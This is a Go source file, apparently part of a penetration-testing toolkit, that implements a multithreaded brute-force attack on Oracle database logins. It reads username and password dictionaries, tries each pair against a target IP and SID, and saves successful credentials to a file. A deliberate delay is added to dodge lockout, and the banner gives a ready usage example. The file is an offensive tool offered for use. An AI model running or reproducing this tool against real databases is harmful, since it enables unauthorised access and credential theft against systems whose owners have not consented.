package tools

import (
	"flag"
	"fmt"
	"github.com/fatih/color"
	go_ora "github.com/sijms/go-ora/v2"
	"strconv"
	"strings"
	"sync"
	"time"
)

// 爆破单个用户名密码
func oracleLogin(ip, port, sid, user, pass string) {

	dsn := fmt.Sprintf("oracle://%s:%s@%s:%s/%s", user, pass, ip, port, sid)

	conn, err := go_ora.NewConnection(dsn, nil) // 第二个参数为连接配置，可以传 nil
	if err != nil {
		fmt.Printf("[FAIL] 创建连接对象失败 %s / %s: %v\n", user, pass, err)
		return
	}

	err = conn.Open()
	if err == nil {
		color.Green("[SUCCESS] %s / %s\n", user, pass)
		FileWrite(fmt.Sprintf("%s: %s/%s", ip, user, pass))
		conn.Close()

		// ORA-01017 是 Oracle 的经典错误码，含义如下：ORA-01017: invalid username/password; logon denied
		//意思是：用户名或密码错误，登录被拒绝。
	} else if strings.Contains(err.Error(), "ORA-01017") {
		color.Red("[FAIL] %s / %s: %v\n", user, pass, err)
	} else {
		fmt.Println(err)
	}

}

// oracle 数据库爆破
func OracleBrute() {

	// 获取输入的参数
	ipInput := flag.String("ip", "", "目标IP")
	portInput := flag.String("port", "1521", "目标端口")
	sidInput := flag.String("sid", "", "服务名称/SID值")
	userdictInput := flag.String("userdict", "", "用户名字典")
	passdictInput := flag.String("passdict", "", "密码字典")
	threatInput := flag.String("thread", "10", "线程数量（不宜过高）")
	flag.Parse()

	ip := *ipInput
	port := *portInput
	sid := *sidInput
	userdict := *userdictInput
	passdict := *passdictInput
	threadStr := *threatInput

	banner := `
		|￣￣￣￣￣￣￣￣￣￣￣| 	
		 |                    |	
		 |  miaomiao~         |	        
		||＿＿＿＿＿＿＿＿＿＿_|        
	        ||                             
	 (\__/) ||          < oracle弱口令爆破工具 >                    
	 (•ㅅ•) ||          
	 / 　 づv            eg:  
				oracle-brute -ip 10.1.20.6 -sid XE -userdict username.txt -passdict password.txt 
`
	fmt.Println(banner)

	// 判断参数输入是否正确
	if ip == "" || sid == "" || userdict == "" || passdict == "" {
		fmt.Println("参数输入错误，请检查")
		return
	}

	thread, err := strconv.Atoi(threadStr)
	if err != nil {
		fmt.Println("线程输入格式错误：", err)
		return
	}

	// 读取字典文件内容
	userSlice := FileReadLines(userdict)
	passSlice := FileReadLines(passdict)

	// 定义多线程及线程数
	var wg sync.WaitGroup
	sem := make(chan struct{}, thread)

	//外层遍历密码，内层遍历用户名，进行多线程爆破账号密码
	for _, pass := range passSlice {
		for _, user := range userSlice {
			wg.Add(1)
			sem <- struct{}{}
			user := user
			go func() {
				defer wg.Done()
				defer func() { <-sem }()
				oracleLogin(ip, port, sid, user, pass)
			}()
			time.Sleep(time.Millisecond * 50) // 防止被数据库封锁
		}
	}
	wg.Wait()

}
